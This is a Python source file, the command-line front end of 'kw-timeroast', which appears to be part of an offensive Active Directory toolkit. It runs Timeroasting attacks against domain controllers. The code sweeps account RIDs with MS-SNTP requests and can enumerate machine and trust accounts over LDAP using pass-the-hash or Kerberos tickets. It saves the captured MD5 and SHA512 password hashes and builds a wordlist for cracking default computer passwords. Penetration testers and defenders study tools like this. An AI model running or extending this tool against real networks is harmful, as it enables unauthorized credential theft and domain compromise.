# SPDX-License-Identifier: Apache-2.0
"""CLI entry point for ``kw-timeroast``: extract SNTP hashes via Timeroasting."""

from __future__ import annotations

import argparse
from itertools import chain
from pathlib import Path
from typing import TYPE_CHECKING

from kerbwolf import __version__
from kerbwolf.attacks.timeroast import timeroast
from kerbwolf.cli._common import parse_nthash, print_header, safe_output_path
from kerbwolf.core.ldap import connect as ldap_connect
from kerbwolf.core.ldap import find_timeroastable
from kerbwolf.log import Logger

if TYPE_CHECKING:
    from collections.abc import Iterable, Iterator

    from kerbwolf.models import RoastResult, TimeroastAccount

# Max RID for 31-bit range (bit 31 is the old-password flag in 68-byte format).
_MAX_RID = (1 << 31) - 1


# ---------------------------------------------------------------------------
# RID range parsing
# ---------------------------------------------------------------------------


class RidRanges:
    """RID ranges from ``-r`` or ``-R``.

    Iterable any number of times, and never expanded into a list: ``1-``
    covers two billion RIDs, which a scan walks until the DC stops answering.
    """

    def __init__(self, ranges: list[range]) -> None:
        """Store the ranges in the order they were given."""
        self._ranges = ranges

    def __iter__(self) -> Iterator[int]:
        """Yield every RID of every range, in order."""
        return chain.from_iterable(self._ranges)


def _parse_rid_ranges(arg: str) -> RidRanges:
    """Parse flexible RID ranges.

    Supports:
    - ``1``         single RID
    - ``1-100``     inclusive range
    - ``1-``        from 1 to max (2^31 - 1)
    - ``-100``      from 0 to 100
    - ``-``         all RIDs (0 to 2^31 - 1)
    - ``1,3,5``     comma-separated singles
    - ``1-100,500-600,1000``  mixed
    """
    return RidRanges(_parse_ranges(arg))


def _parse_ranges(arg: str) -> list[range]:
    ranges: list[range] = []
    for raw_part in arg.split(","):
        part = raw_part.strip()
        if not part:
            continue
        if part == "-":
            ranges.append(range(_MAX_RID + 1))
        elif part.startswith("-"):
            end = int(part[1:])
            ranges.append(range(end + 1))
        elif part.endswith("-"):
            start = int(part[:-1])
            ranges.append(range(start, _MAX_RID + 1))
        elif "-" in part:
            start_s, end_s = part.split("-", 1)
            start, end = int(start_s), int(end_s)
            if start > end:
                msg = f"Invalid range: {part}"
                raise argparse.ArgumentTypeError(msg)
            ranges.append(range(start, end + 1))
        else:
            ranges.append(range(int(part), int(part) + 1))
    return ranges


# ---------------------------------------------------------------------------
# Argument parser
# ---------------------------------------------------------------------------


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="kw-timeroast",
        description="Timeroasting: extract SNTP password hashes for computer, gMSA, and trust accounts.",
        epilog=(
            "Examples:\n"
            "  kw-timeroast 10.0.0.1\n"
            "  kw-timeroast 10.0.0.1 -r 500-2000 -o hashes.txt\n"
            "  kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -u admin -p pass\n"
            "  kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -k -c admin.ccache\n"
            "  kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -u admin -H :aabb... --wordlist crack.txt\n"
            "  kw-timeroast 10.0.0.1 --format both --password both -o hashes.txt\n"
            "  kw-timeroast 10.0.0.1 --rid-prefix\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    parser.add_argument("-v", "--verbose", action="count", default=0, help="Increase verbosity (-v, -vv)")

    parser.add_argument("dc", help="Domain controller IP or hostname")

    # -- Attack options -------------------------------------------------------
    grp = parser.add_argument_group("attack")
    grp.add_argument(
        "-r",
        "--rids",
        type=_parse_rid_ranges,
        default=None,
        metavar="RANGE",
        help="RID range (default: 500-10000). Supports: 1, 1-100, 1-, -100, -, 1-100,500-600",
    )
    grp.add_argument(
        "-R",
        "--rids-file",
        metavar="FILE",
        help="File with RIDs, one per line (same range syntax per line)",
    )
    grp.add_argument(
        "--format",
        choices=["auth", "extended", "both"],
        default="auth",
        dest="fmt",
        help="Packet format: auth=68-byte MD5 (default), extended=120-byte KDF+HMAC-SHA512, both=send both per RID",
    )
    grp.add_argument(
        "--password",
        choices=["current", "previous", "both"],
        default="current",
        help="Which password the 68-byte request asks for: current (default), previous, or both. The 120-byte request always asks for the previous one",
    )

    # -- LDAP options ---------------------------------------------------------
    grp = parser.add_argument_group("ldap")
    grp.add_argument("--ldap", action="store_true", help="Query LDAP for machine and trust accounts (requires auth)")
    grp.add_argument("--ldap-ssl", action="store_true", help="Use LDAPS (port 636)")
    grp.add_argument("-d", "--domain", metavar="DOMAIN", help="AD domain (e.g. corp.local)")
    grp.add_argument("-u", "--user", metavar="USER", help="Username for LDAP auth")
    grp.add_argument("-p", "--ldap-password", metavar="PASS", dest="ldap_pass", help="Password for LDAP auth")
    grp.add_argument("-H", "--hashes", metavar="HASH", help="NT hash for LDAP auth (LM:NT, :NT, or NT)")
    grp.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos auth for LDAP")
    grp.add_argument("-c", "--ccache", metavar="FILE", help="Kerberos ccache file")
    grp.add_argument("--dc-hostname", metavar="HOST", help="DC FQDN (for Kerberos SPN, auto-detected if omitted)")

    # -- Network options ------------------------------------------------------
    grp = parser.add_argument_group("network")
    grp.add_argument("-a", "--rate", type=int, default=180, metavar="N", help="Queries per second (default: 180)")
    grp.add_argument("-t", "--timeout", type=float, default=24.0, metavar="SEC", help="Give up after SEC seconds of silence (default: 24)")
    grp.add_argument("--src-port", type=int, default=0, metavar="PORT", help="Source UDP port (default: dynamic). Set to 123 for strict firewalls.")
    grp.add_argument("--port", type=int, default=123, metavar="PORT", help="Destination UDP port (default: 123)")

    # -- Output options -------------------------------------------------------
    grp = parser.add_argument_group("output")
    grp.add_argument("-o", "--output", metavar="FILE", help="Write hashes to file (splits by hash type and password age)")
    grp.add_argument("--rid-prefix", action="store_true", help="Prepend account name (or RID) to each output line")
    grp.add_argument("--wordlist", metavar="FILE", help="Write cracking wordlist (lowercase names, with and without 14-char truncation)")

    return parser


def _load_rids_from_file(path: str) -> RidRanges:
    """Load RID ranges from a file, one range expression per line."""
    ranges: list[range] = []
    for line in Path(path).read_text().splitlines():
        stripped = line.strip()
        if stripped and not stripped.startswith("#"):
            ranges.extend(_parse_ranges(stripped))
    return RidRanges(ranges)


# ---------------------------------------------------------------------------
# LDAP helpers
# ---------------------------------------------------------------------------


def _ldap_discover(args: argparse.Namespace, logger: Logger) -> list[TimeroastAccount]:
    """Connect to LDAP and enumerate the timeroastable machine and trust accounts."""
    if not args.domain:
        logger.error("--ldap requires -d/--domain")
        return []

    # Build LDAP auth kwargs
    nthash = ""
    if args.hashes:
        nthash = parse_nthash(args.hashes).hex()

    logger.info("Connecting to LDAP on %s", args.dc)
    conn = ldap_connect(
        dc_ip=args.dc,
        domain=args.domain,
        username=args.user or "",
        password=args.ldap_pass or "",
        nthash=nthash,
        use_ssl=args.ldap_ssl,
        use_kerberos=args.kerberos,
        ccache=args.ccache,
        dc_hostname=args.dc_hostname,
    )

    accounts = find_timeroastable(conn, args.domain)
    logger.success("LDAP: %d machine and trust account(s) found", len(accounts))
    for acct in accounts:
        logger.verbose("  RID=%-6d %s", acct.rid, acct.samaccountname)
    return accounts


def _write_wordlist(accounts: list[TimeroastAccount], path: str, logger: Logger) -> None:
    """Write a cracking wordlist for default computer passwords.

    For each account, outputs:
    - Lowercase sAMAccountName without trailing ``$`` (full length)
    - Same but truncated to 14 characters (NT4 default password limit)

    Deduplicates entries where both forms are identical (name <= 14 chars).
    """
    seen: set[str] = set()
    lines: list[str] = []

    for acct in accounts:
        name = acct.samaccountname.removesuffix("$")
        name_lower = name.lower()
        name_14 = name_lower[:14]

        if name_lower not in seen:
            seen.add(name_lower)
            lines.append(name_lower)
        if name_14 != name_lower and name_14 not in seen:
            seen.add(name_14)
            lines.append(name_14)

    out = Path(path)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text("\n".join(lines) + "\n")
    logger.success("Wrote %d wordlist entries to %s", len(lines), out)


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

_FMT_LABELS = {
    "auth": "Authenticator (68B, MD5)",
    "extended": "ExtendedAuthenticator (120B, KDF+HMAC-SHA512)",
    "both": "Both (68B + 120B)",
}


def _format_line(result: RoastResult, *, rid_prefix: bool) -> str:
    """Format a single hash output line."""
    if rid_prefix:
        return f"{result.username}:{result.hash_string}"
    return result.hash_string


def _print_results(
    current: list[RoastResult],
    previous: list[RoastResult],
    extended: list[RoastResult],
    logger: Logger,
    *,
    rid_prefix: bool,
) -> None:
    """Print all hashes to stdout."""
    if not current and not previous and not extended:
        logger.warning("No hashes extracted.")
        return

    for label, results in (("current, md5", current), ("previous, md5", previous), ("previous, sha512", extended)):
        for r in results:
            logger.info("%s (%s)", r.username, label)
            print(_format_line(r, rid_prefix=rid_prefix))

    parts = []
    if current:
        parts.append(f"{len(current)} current md5")
    if previous:
        parts.append(f"{len(previous)} previous md5")
    if extended:
        parts.append(f"{len(extended)} previous sha512")
    logger.success("%s hash(es) captured", ", ".join(parts))


def _write_file(
    results: list[RoastResult],
    path_str: str,
    logger: Logger,
    *,
    rid_prefix: bool,
    label: str,
) -> None:
    """Write a list of results to a single file."""
    if not results:
        return
    path = safe_output_path(path_str)
    path.parent.mkdir(parents=True, exist_ok=True)
    lines = [_format_line(r, rid_prefix=rid_prefix) for r in results]
    path.write_text("\n".join(lines) + "\n")
    logger.success("Wrote %d %s hash(es) to %s", len(results), label, path)


def _write_results(
    current: list[RoastResult],
    previous: list[RoastResult],
    extended: list[RoastResult],
    output: str | None,
    logger: Logger,
    *,
    rid_prefix: bool,
) -> None:
    """Write hashes to files, split by hash type and password age.

    Output file naming (given ``-o hashes.txt``)::

        hashes-current-md5.txt        68B current password hashes
        hashes-previous-md5.txt       68B previous password hashes
        hashes-previous-sha512.txt    120B hashes, always of the previous password

    "Previous" is what was asked for.  An account with no previous password,
    which is every machine account, answers with its current one.

    Files are only created when they contain at least one hash.
    """
    if output is None:
        return

    base = Path(output)
    stem = base.stem
    suffix = base.suffix or ".txt"
    parent = base.parent

    def _path(tag: str) -> str:
        return str(parent / f"{stem}-{tag}{suffix}")

    _write_file(current, _path("current-md5"), logger, rid_prefix=rid_prefix, label="current md5")
    _write_file(previous, _path("previous-md5"), logger, rid_prefix=rid_prefix, label="previous md5")
    _write_file(extended, _path("previous-sha512"), logger, rid_prefix=rid_prefix, label="previous sha512")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main(argv: list[str] | None = None) -> None:
    """Entry point for ``kw-timeroast``."""
    parser = _build_parser()
    args = parser.parse_args(argv)
    logger = Logger(args.verbose)

    # -- Resolve RID source ---------------------------------------------------
    # Priority: --ldap > -r/-R > default range
    accounts: list[TimeroastAccount] | None = None
    rids: Iterable[int] | None = None

    if args.ldap:
        accounts = _ldap_discover(args, logger)
        if not accounts:
            logger.warning("No accounts found via LDAP.")
            return
        rid_desc = f"LDAP ({len(accounts)} accounts)"
    elif args.rids_file:
        rids = _load_rids_from_file(args.rids_file)
        rid_desc = f"from {args.rids_file}"
    elif isinstance(args.rids, RidRanges):
        rids = args.rids
        rid_desc = "custom range"
    else:
        rids = None
        rid_desc = "500-10000 (default)"

    # -- Wordlist (requires LDAP accounts) ------------------------------------
    if args.wordlist:
        if accounts is None:
            logger.error("--wordlist requires --ldap (needs account names)")
            return
        _write_wordlist(accounts, args.wordlist, logger)

    # -- Header ---------------------------------------------------------------
    print_header(
        "kw-timeroast",
        [
            ("Attack", "Timeroasting (MS-SNTP)"),
            ("DC", f"{args.dc}:{args.port}"),
            ("Format", _FMT_LABELS[args.fmt]),
            ("Password", args.password),
            ("RIDs", rid_desc),
            ("Rate", f"{args.rate}/s"),
            ("Timeout", f"{args.timeout}s"),
            *([("Output", args.output)] if args.output else []),
        ],
    )

    # -- Timeroast ------------------------------------------------------------
    try:
        results = timeroast(
            dc_ip=args.dc,
            rids=rids,
            accounts=accounts,
            rate=args.rate,
            timeout=args.timeout,
            src_port=args.src_port,
            port=args.port,
            password=args.password,
            fmt=args.fmt,
        )
    except PermissionError as exc:
        logger.error("%s", exc)  # noqa: TRY400
        return
    except KeyboardInterrupt:
        logger.info("Interrupted.")
        return

    _print_results(
        results.current,
        results.previous,
        results.extended,
        logger,
        rid_prefix=args.rid_prefix,
    )
    _write_results(
        results.current,
        results.previous,
        results.extended,
        args.output,
        logger,
        rid_prefix=args.rid_prefix,
    )


if __name__ == "__main__":
    main()
